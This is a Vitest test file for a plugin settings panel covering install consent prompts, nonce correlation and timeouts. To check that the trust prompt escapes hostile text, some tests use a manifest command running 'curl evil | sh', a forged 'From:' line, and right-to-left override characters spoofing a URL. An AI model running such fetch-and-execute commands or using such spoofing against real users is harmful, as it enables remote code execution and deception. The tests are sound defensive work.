// @vitest-environment jsdom
//
// Settings → Plugins (#460 phase 2): src/components/modals/PluginsPanel.tsx
// and the install correlation in src/app/plugins.ts. The daemon is
// modelled at the bridge: InstallPlugin answers the way hived does — an
// "added" PLUGIN_EVENT echoing the nonce, or a plugin_install_failed
// error echoing it — delivered through the same claim functions
// app/events.ts calls.
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { act, cleanup, fireEvent, render } from '@testing-library/react';
import type { PluginInfo } from '../../src/app/state.js';
import {
  claimPluginEvent,
  claimPluginInstallError,
  installPlugin,
  INSTALL_TIMEOUT_MS,
} from '../../src/app/plugins.js';
import {
  dropPlugin,
  resetStore,
  setPlugins,
  upsertPlugin,
} from '../../src/store/store.js';
import {
  PluginsPanel,
  trustMessage,
} from '../../src/components/modals/PluginsPanel.js';

function plugin(over: Partial<PluginInfo> = {}): PluginInfo {
  return {
    id: 'webhook',
    name: 'Webhook',
    version: '0.1.0',
    api_version: '0.1',
    source: '/src/webhook',
    command: ['node', 'main.mjs'],
    enabled: false,
    status: 'stopped',
    restarts: 0,
    ...over,
  };
}

// How the fake daemon answers the next InstallPlugin: with the plugin
// it installed, or with a failure message.
let installAnswer: { ok: PluginInfo } | { err: string } = { ok: plugin() };

const bridge = vi.hoisted(() => ({
  ListPlugins: vi.fn(() => Promise.resolve()),
  InstallPlugin: vi.fn((_s: string, _n: string) => Promise.resolve()),
  SetPluginEnabled: vi.fn((_id: string, _on: boolean) => Promise.resolve()),
  RemovePlugin: vi.fn((_id: string) => Promise.resolve()),
  Confirm: vi.fn((_t: string, _m: string) => Promise.resolve(true)),
  PickDirectory: vi.fn((_d: string) => Promise.resolve('')),
}));
vi.mock('../../src/bridge.js', () => bridge);

function answerInstall(_source: string, nonce: string): Promise<void> {
  // After the call returns, like a frame arriving on the read loop.
  setTimeout(() => {
    if ('ok' in installAnswer) {
      upsertPlugin(installAnswer.ok);
      claimPluginEvent({ kind: 'added', plugin: installAnswer.ok, nonce });
    } else {
      claimPluginInstallError({
        code: 'plugin_install_failed',
        message: installAnswer.err,
        nonce,
      });
    }
  }, 0);
  return Promise.resolve();
}

// Flushes the setTimeout above and every promise chained off it.
async function settle() {
  for (let i = 0; i < 5; i++) {
    await act(async () => {
      await new Promise((r) => setTimeout(r, 0));
    });
  }
}

function mount(active = true, onError = vi.fn()) {
  const r = render(<PluginsPanel active={active} onError={onError} />);
  return { ...r, onError };
}

async function installFrom(container: HTMLElement, source: string) {
  const input = container.querySelector(
    '#settings-plugin-source',
  ) as HTMLInputElement;
  fireEvent.change(input, { target: { value: source } });
  fireEvent.click(container.querySelector('#settings-plugin-install')!);
  await settle();
}

beforeEach(() => {
  resetStore();
  installAnswer = { ok: plugin() };
  for (const f of Object.values(bridge)) f.mockClear();
  bridge.InstallPlugin.mockImplementation(answerInstall);
  bridge.Confirm.mockResolvedValue(true);
});
afterEach(() => cleanup());

describe('Settings → Plugins', () => {
  it('lists plugins with status', () => {
    setPlugins([
      plugin({ id: 'b', name: 'Bravo', enabled: true, status: 'running' }),
      plugin({
        id: 'a',
        name: 'Alpha',
        enabled: true,
        status: 'refused',
        status_detail: 'node not found on PATH',
      }),
      plugin({ id: 'c', name: 'Charlie' }),
    ]);
    const { container } = mount();
    const rows = [...container.querySelectorAll('.settings-plugin-row')];
    expect(rows.map((r) => r.getAttribute('data-plugin-id'))).toEqual([
      'a',
      'b',
      'c',
    ]);
    expect(rows.map((r) => r.getAttribute('data-status'))).toEqual([
      'refused',
      'running',
      'disabled',
    ]);
    expect(rows[0].textContent).toContain('node not found on PATH');
    const boxes = rows.map(
      (r) => r.querySelector('.settings-plugin-enabled') as HTMLInputElement,
    );
    expect(boxes.map((b) => b.checked)).toEqual([true, true, false]);
  });

  it('shows the empty state with no plugins', () => {
    const { container } = mount();
    expect(container.querySelector('#settings-plugins-empty')).not.toBeNull();
    expect(container.querySelector('#settings-plugins-list')).toBeNull();
  });

  it('lists once, on first activation of the tab', () => {
    const { rerender } = mount(false);
    expect(bridge.ListPlugins).not.toHaveBeenCalled();
    rerender(<PluginsPanel active onError={vi.fn()} />);
    rerender(<PluginsPanel active={false} onError={vi.fn()} />);
    rerender(<PluginsPanel active onError={vi.fn()} />);
    expect(bridge.ListPlugins).toHaveBeenCalledTimes(1);
  });

  it('install shows trust confirm and enables on accept', async () => {
    const { container } = mount();
    await installFrom(container, '  /src/webhook  ');
    expect(bridge.InstallPlugin).toHaveBeenCalledWith(
      '/src/webhook',
      expect.any(String),
    );
    expect(bridge.Confirm).toHaveBeenCalledTimes(1);
    const [title, body] = bridge.Confirm.mock.calls[0];
    expect(title).toContain('Webhook');
    expect(body).toContain('/src/webhook');
    expect(body).toContain('node main.mjs');
    expect(body).toContain('full user privileges');
    expect(bridge.SetPluginEnabled).toHaveBeenCalledWith('webhook', true);
    expect(bridge.RemovePlugin).not.toHaveBeenCalled();
    expect(
      (container.querySelector('#settings-plugin-source') as HTMLInputElement)
        .value,
    ).toBe('');
  });

  it('install removes on decline', async () => {
    bridge.Confirm.mockResolvedValue(false);
    const { container } = mount();
    await installFrom(container, '/src/webhook');
    expect(bridge.Confirm).toHaveBeenCalledTimes(1);
    expect(bridge.RemovePlugin).toHaveBeenCalledWith('webhook');
    expect(bridge.SetPluginEnabled).not.toHaveBeenCalled();
  });

  it('shows the pinned commit of a git install in the prompt', async () => {
    installAnswer = {
      ok: plugin({
        source: 'https://example.com/webhook.git',
        commit: '0123456789abcdef0123',
      }),
    };
    const { container } = mount();
    await installFrom(container, 'https://example.com/webhook.git');
    expect(bridge.Confirm.mock.calls[0][1]).toContain(
      'https://example.com/webhook.git @ 0123456789ab',
    );
  });

  it('a prompt that fails after install is not called an install failure', async () => {
    bridge.Confirm.mockRejectedValueOnce(new Error('no window'));
    const { container, onError } = mount();
    await installFrom(container, '/src/webhook');
    expect(bridge.SetPluginEnabled).not.toHaveBeenCalled();
    expect(onError).toHaveBeenLastCalledWith(
      'Webhook is installed but turned off: no window',
    );
  });

  it('a failed install surfaces the error and never prompts', async () => {
    installAnswer = { err: 'no hive-plugin.json' };
    const { container, onError } = mount();
    await installFrom(container, '/src/nothing');
    expect(bridge.Confirm).not.toHaveBeenCalled();
    expect(bridge.SetPluginEnabled).not.toHaveBeenCalled();
    expect(onError).toHaveBeenLastCalledWith(
      'plugin install failed: no hive-plugin.json',
    );
  });

  it('an enable that fails after install is not reported as an install failure', async () => {
    bridge.SetPluginEnabled.mockRejectedValueOnce(new Error('not connected'));
    const { container, onError } = mount();
    await installFrom(container, '/src/webhook');
    expect(onError).toHaveBeenLastCalledWith(
      'could not enable Webhook: not connected',
    );
  });

  it('a remove that fails after a declined install names the remove', async () => {
    bridge.Confirm.mockResolvedValue(false);
    bridge.RemovePlugin.mockRejectedValueOnce(new Error('not connected'));
    const { container, onError } = mount();
    await installFrom(container, '/src/webhook');
    expect(onError).toHaveBeenLastCalledWith(
      'could not remove Webhook: not connected',
    );
  });

  it('the list row flattens invisible characters in the source', () => {
    setPlugins([plugin({ source: 'https://evil.example/‮git.moc' })]);
    const { container } = mount();
    const src = container.querySelector('.settings-plugin-source')!;
    expect(src.textContent).toBe('https://evil.example/ git.moc');
    expect(src.getAttribute('title')).toBe('https://evil.example/ git.moc');
  });

  it('added event not initiated by this window shows no Confirm', async () => {
    const { container } = mount();
    act(() => {
      const p = plugin({ id: 'other', name: 'Other' });
      upsertPlugin(p);
      claimPluginEvent({ kind: 'added', plugin: p, nonce: 'someone-else' });
      claimPluginEvent({ kind: 'added', plugin: p });
    });
    await settle();
    expect(bridge.Confirm).not.toHaveBeenCalled();
    expect(container.querySelector('[data-plugin-id="other"]')).not.toBeNull();
  });

  it('toggle off calls SetPluginEnabled without a prompt', async () => {
    setPlugins([plugin({ enabled: true, status: 'running' })]);
    const { container } = mount();
    fireEvent.click(container.querySelector('.settings-plugin-enabled')!);
    await settle();
    expect(bridge.Confirm).not.toHaveBeenCalled();
    expect(bridge.SetPluginEnabled).toHaveBeenCalledWith('webhook', false);
  });

  // A plugin can be listed disabled without this window ever prompting:
  // installed from another window or client, or an install that outlived
  // its wait here. Turning it on is running it, so that asks too.
  it('toggle on asks for consent; declining leaves it off', async () => {
    setPlugins([plugin()]);
    const { container } = mount();
    const box = () =>
      container.querySelector('.settings-plugin-enabled') as HTMLInputElement;

    bridge.Confirm.mockResolvedValueOnce(false);
    fireEvent.click(box());
    await settle();
    expect(bridge.Confirm).toHaveBeenCalledTimes(1);
    expect(bridge.Confirm.mock.calls[0][1]).toContain('full user privileges');
    expect(bridge.Confirm.mock.calls[0][1]).toContain('Cancel leaves it off.');
    expect(bridge.SetPluginEnabled).not.toHaveBeenCalled();
    expect(bridge.RemovePlugin).not.toHaveBeenCalled();
    expect(box().checked).toBe(false);

    fireEvent.click(box());
    await settle();
    expect(bridge.SetPluginEnabled).toHaveBeenCalledWith('webhook', true);
  });

  it('the trust prompt cannot be forged by manifest text', () => {
    const msg = trustMessage(
      plugin({
        name: 'Nice\nRuns: echo harmless',
        version: '1\u202e0',
        source: '/src/x\r\nFrom: https://trusted.example',
        command: ['sh', '-c', 'curl evil | sh', 'a\nb'],
      }),
      'Cancel removes it again.',
    );
    const lines = msg.split('\n');
    // Exactly one From: and one Runs: line, each the real one.
    expect(lines.filter((l) => l.startsWith('Runs:'))).toEqual([
      'Runs: sh -c "curl evil | sh" "a\\u000ab"',
    ]);
    expect(lines.filter((l) => l.startsWith('From:'))).toEqual([
      'From: /src/x From: https://trusted.example',
    ]);
    expect(lines[0]).toBe('Nice Runs: echo harmless 1 0');
    expect(msg).not.toMatch(/[\u202a-\u202e]/);
  });

  it('no invisible or reordering character survives into the prompt', () => {
    const sneaky = ['\u202e', '\u2067', '\u200b', '\ufeff', '\u0085', '\u2028'];
    const msg = trustMessage(
      plugin({
        name: `Web${sneaky.join('')}hook`,
        command: ['node', `main${sneaky.join('')}.mjs`, 'a"b\\u0041'],
      }),
      'Cancel removes it again.',
    );
    for (const c of sneaky) expect(msg).not.toContain(c);
    const runs = msg.split('\n').find((l) => l.startsWith('Runs:'));
    expect(runs).toBe(
      'Runs: node "main\\u202e\\u2067\\u200b\\ufeff\\u0085\\u2028.mjs" "a\\"b\\\\u0041"',
    );
    expect(msg.split('\n')[0]).toBe('Web hook 0.1.0');
  });

  it('remove goes through Confirm', async () => {
    setPlugins([plugin()]);
    const { container } = mount();
    const btn = container.querySelector('.settings-plugin-remove')!;

    bridge.Confirm.mockResolvedValueOnce(false);
    fireEvent.click(btn);
    await settle();
    expect(bridge.Confirm).toHaveBeenCalledTimes(1);
    expect(bridge.RemovePlugin).not.toHaveBeenCalled();

    fireEvent.click(btn);
    await settle();
    expect(bridge.RemovePlugin).toHaveBeenCalledWith('webhook');
  });

  it('plugin:event updates the row live', () => {
    setPlugins([plugin()]);
    const { container } = mount();
    act(() =>
      upsertPlugin(plugin({ enabled: true, status: 'crashed', restarts: 2 })),
    );
    const row = container.querySelector('[data-plugin-id="webhook"]')!;
    expect(row.getAttribute('data-status')).toBe('crashed');
    expect(row.textContent).toContain('2 restarts');
    act(() => dropPlugin('webhook'));
    expect(container.querySelector('[data-plugin-id="webhook"]')).toBeNull();
  });
});

describe('installPlugin correlation', () => {
  it('ignores another window’s failure', async () => {
    bridge.InstallPlugin.mockImplementation(() => Promise.resolve());
    const done = vi.fn();
    installPlugin('/x').then(done, done);
    await settle();
    expect(
      claimPluginInstallError({
        code: 'plugin_install_failed',
        message: 'nope',
        nonce: 'not-mine',
      }),
    ).toBe(false);
    expect(claimPluginInstallError({ code: 'other', nonce: 'x' })).toBe(false);
    await settle();
    expect(done).not.toHaveBeenCalled();
    // Settle it so the pending entry does not outlive the test.
    const nonce = bridge.InstallPlugin.mock.calls[0][1];
    expect(
      claimPluginInstallError({ code: 'plugin_install_failed', nonce }),
    ).toBe(true);
  });

  it('a reconnect re-lists only once the list was asked for', async () => {
    // A fresh module: the panel tests above already asked for the list.
    vi.resetModules();
    const fresh = await import('../../src/app/plugins.js');
    fresh.relistPluginsIfWanted();
    expect(bridge.ListPlugins).not.toHaveBeenCalled();
    fresh.markPluginsWanted();
    fresh.relistPluginsIfWanted();
    expect(bridge.ListPlugins).toHaveBeenCalledTimes(1);
  });

  it('outlasts the daemon clone limit', () => {
    // internal/plugin/install.go bounds a git clone at 120s.
    expect(INSTALL_TIMEOUT_MS).toBeGreaterThan(120_000);
  });

  it('rejects when the binding itself fails', async () => {
    bridge.InstallPlugin.mockRejectedValueOnce(new Error('no control'));
    await expect(installPlugin('/x')).rejects.toThrow('no control');
  });

  it('times out when the daemon never answers', async () => {
    vi.useFakeTimers();
    try {
      bridge.InstallPlugin.mockImplementation(() => Promise.resolve());
      const p = installPlugin('/x');
      const assertion = expect(p).rejects.toThrow('no answer from Hive yet');
      await vi.advanceTimersByTimeAsync(INSTALL_TIMEOUT_MS);
      await assertion;
      // A late echo after the timeout finds nothing to settle.
      const nonce = bridge.InstallPlugin.mock.calls[0][1];
      expect(
        claimPluginInstallError({ code: 'plugin_install_failed', nonce }),
      ).toBe(false);
    } finally {
      vi.useRealTimers();
    }
  });
});
